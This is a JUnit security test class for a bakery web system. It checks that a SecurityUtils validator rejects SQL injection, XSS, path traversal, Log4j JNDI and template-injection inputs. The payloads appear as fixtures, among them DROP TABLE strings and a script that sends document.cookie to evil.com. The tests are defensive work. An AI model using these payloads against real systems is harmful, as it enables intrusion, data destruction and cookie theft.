package com.pasteleria.cordova.security;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.TestMethodOrder;
import org.junit.jupiter.api.MethodOrderer;

import static org.junit.jupiter.api.Assertions.*;

 
@TestMethodOrder(MethodOrderer.DisplayName.class)
@DisplayName("🔐 Security Tests - Sistema Pastelería (Independent)")
public class SecurityTestsStandalone {

    private SecurityUtils securityUtils;

    @BeforeEach
    void setUp() {
        securityUtils = new SecurityUtils();
    }

    @Test
    @DisplayName("🛡️ SEC-001: Prevención de Inyección SQL - Detección de patrones maliciosos")
    void testSQLInjectionDetection() {
        // Casos de inyección SQL clásicos
        String[] maliciousInputs = {
            "1' OR '1'='1' --",
            "'; DROP TABLE usuarios; --",
            "1' UNION SELECT * FROM usuarios --",
            "admin'--",
            "' OR 1=1#",
            "1; DELETE FROM productos; --"
        };

        for (String input : maliciousInputs) {
            assertFalse(securityUtils.isSQLSafe(input), 
                       "❌ SQL Injection detectado pero no bloqueado: " + input);
        }

        // Casos válidos que SÍ deben pasar
        String[] validInputs = {"123", "usuario_valido", "producto-123"};
        for (String input : validInputs) {
            assertTrue(securityUtils.isSQLSafe(input), 
                      "✅ Input válido incorrectamente bloqueado: " + input);
        }
    }

    @Test
    @DisplayName("🛡️ SEC-002: Protección XSS - Sanitización de scripts maliciosos")
    void testXSSProtection() {
        // Payloads XSS comunes
        String[] xssPayloads = {
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//"
        };

        for (String payload : xssPayloads) {
            assertFalse(securityUtils.isXSSSafe(payload), 
                       "❌ XSS payload detectado pero no bloqueado: " + payload);
            
            String sanitized = securityUtils.sanitizeXSS(payload);
            assertNotEquals(payload, sanitized, 
                           "⚠️ XSS payload no fue sanitizado: " + payload);
            assertFalse(sanitized.contains("<script"), 
                       "❌ Script tag no removido después de sanitización");
        }
    }

    @Test
    @DisplayName("🛡️ SEC-003: Validación Path Traversal - Prevención de acceso no autorizado")
    void testPathTraversalProtection() {
        // Ataques de path traversal comunes
        String[] traversalPayloads = {
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f",
            "....//....//....//",
            "..\\..\\.."
        };

        for (String payload : traversalPayloads) {
            assertFalse(securityUtils.isPathSafe(payload), 
                       "❌ Path Traversal detectado pero no bloqueado: " + payload);
        }

        // Paths válidos
        String[] validPaths = {"imagen.jpg", "documentos/factura.pdf", "uploads/producto_123.png"};
        for (String path : validPaths) {
            assertTrue(securityUtils.isPathSafe(path), 
                      "✅ Path válido incorrectamente bloqueado: " + path);
        }
    }

    @Test
    @DisplayName("🛡️ SEC-004: Validación de IDs - Solo números enteros válidos")
    void testSecureIdValidation() {
        // IDs válidos
        String[] validIds = {"1", "123", "999999"};
        for (String id : validIds) {
            assertTrue(securityUtils.isValidId(id), 
                      "✅ ID válido incorrectamente rechazado: " + id);
        }

        // IDs inválidos o maliciosos
        String[] invalidIds = {
            "1' OR 1=1", 
            "abc", 
            "-1", 
            "", 
            "null", 
            "undefined",
            "1.5",
            "1e10"
        };
        
        for (String id : invalidIds) {
            assertFalse(securityUtils.isValidId(id), 
                       "❌ ID inválido permitido: " + id);
        }
    }

    @Test
    @DisplayName("🛡️ SEC-005: Sanitización completa de inputs - Limpieza integral")
    void testInputSanitization() {
        String maliciousInput = "<script>alert('XSS')</script>'; DROP TABLE usuarios; --../../../etc/passwd";
        
        String sanitized = securityUtils.sanitizeInput(maliciousInput);
        
        assertNotNull(sanitized, "Sanitización no debe retornar null");
        assertFalse(sanitized.contains("<script"), "Script tags deben ser removidos");
        assertFalse(sanitized.contains("DROP TABLE"), "Comandos SQL deben ser removidos");
        assertFalse(sanitized.contains("../"), "Path traversal debe ser removido");
        assertTrue(sanitized.length() > 0, "Input sanitizado no debe estar vacío");
    }

    @Test
    @DisplayName("🛡️ SEC-006: Validación de entrada segura - Múltiples amenazas")
    void testSecureInputValidation() {
        // Input completamente malicioso
        String maliciousInput = "<script>alert('XSS')</script>1' OR '1'='1' --../../../etc/passwd";
        assertFalse(securityUtils.isInputSecure(maliciousInput), 
                   "❌ Input malicioso múltiple no detectado");

        // Input válido simple
        String validInput = "Mi comentario sobre el producto";
        assertTrue(securityUtils.isInputSecure(validInput), 
                  "✅ Input válido incorrectamente rechazado");

        // Input borderline (contiene algunos caracteres especiales pero es válido)
        String borderlineInput = "Precio: $25.99 (descuento 10%)";
        assertTrue(securityUtils.isInputSecure(borderlineInput), 
                  "✅ Input borderline válido incorrectamente rechazado");
    }

    @Test
    @DisplayName("🛡️ SEC-007: Manejo seguro de errores - Sin información sensible")
    void testSecureErrorHandling() {
        String sensitiveMessage = "Database connection failed: password=admin123, user=root";
        
        String secureMessage = securityUtils.createSecureErrorMessage(sensitiveMessage);
        
        assertNotNull(secureMessage, "Mensaje de error seguro no debe ser null");
        assertFalse(secureMessage.contains("password"), "No debe contener información de contraseña");
        assertFalse(secureMessage.contains("admin123"), "No debe contener credenciales");
        assertFalse(secureMessage.contains("root"), "No debe contener usuario");
        assertTrue(secureMessage.contains("Error interno"), "Debe mostrar mensaje genérico");
    }

    @Test
    @DisplayName("🛡️ SEC-008: Validación de rangos numéricos - Prevención de overflow")
    void testNumericRangeValidation() {
        // Valores en rango válido
        assertTrue(securityUtils.isValidId("1"), "ID 1 debe ser válido");
        assertTrue(securityUtils.isValidId("999999"), "ID 999999 debe ser válido");

        // Valores fuera de rango o maliciosos
        assertFalse(securityUtils.isValidId("0"), "ID 0 no debe ser válido");
        assertFalse(securityUtils.isValidId("-1"), "ID negativo no debe ser válido");
        assertFalse(securityUtils.isValidId("9999999999999999999"), "ID demasiado grande no debe ser válido");
    }

    @Test
    @DisplayName("🛡️ SEC-009: Protección contra caracteres especiales maliciosos")
    void testSpecialCharacterProtection() {
        String[] maliciousChars = {
            "\0", // Null byte
            "\r\n", // CRLF injection
            "%00", // URL encoded null
            "${jndi:ldap://evil.com/exploit}", // Log4j injection
            "{{7*7}}", // Template injection
        };

        for (String malicious : maliciousChars) {
            boolean result = securityUtils.isInputSecure(malicious);
            if (result) {
                System.out.println("❌ FALLO: Carácter malicioso no detectado: '" + malicious + "' (length=" + malicious.length() + ", bytes=" + java.util.Arrays.toString(malicious.getBytes()) + ")");
            }
            assertFalse(result, 
                       "❌ Carácter malicioso no detectado: " + malicious + " (length=" + malicious.length() + ")");
        }
    }

    @Test
    @DisplayName("🛡️ SEC-010: Test integral de seguridad - Combinación de amenazas")
    void testIntegratedSecurityValidation() {
        // Escenario: Atacante intenta múltiples vectores de ataque simultáneamente
        String multiVectorAttack = "producto_id=1' OR 1=1 UNION SELECT password FROM users WHERE username='admin'--" +
                                 "&nombre=<script>fetch('http://evil.com/steal?data='+document.cookie)</script>" +
                                 "&archivo=../../../etc/passwd%00.jpg";

        // Cada componente debe ser detectado individualmente
        assertFalse(securityUtils.isSQLSafe("1' OR 1=1 UNION SELECT password FROM users"), 
                   "❌ SQL injection component not detected");
        
        assertFalse(securityUtils.isXSSSafe("<script>fetch('http://evil.com/steal?data='+document.cookie)</script>"), 
                   "❌ XSS component not detected");
        
        assertFalse(securityUtils.isPathSafe("../../../etc/passwd%00.jpg"), 
                   "❌ Path traversal component not detected");

        // El input completo debe ser rechazado
        assertFalse(securityUtils.isInputSecure(multiVectorAttack), 
                   "❌ Multi-vector attack not detected comprehensively");

        System.out.println("✅ Todas las pruebas de seguridad pasaron correctamente!");
        System.out.println("🔐 Sistema protegido contra las siguientes amenazas:");
        System.out.println("   - SQL Injection");
        System.out.println("   - Cross-Site Scripting (XSS)");
        System.out.println("   - Path Traversal");
        System.out.println("   - Input Validation Attacks");
        System.out.println("   - Special Character Exploits");
        System.out.println("   - Multi-Vector Attacks");
    }
}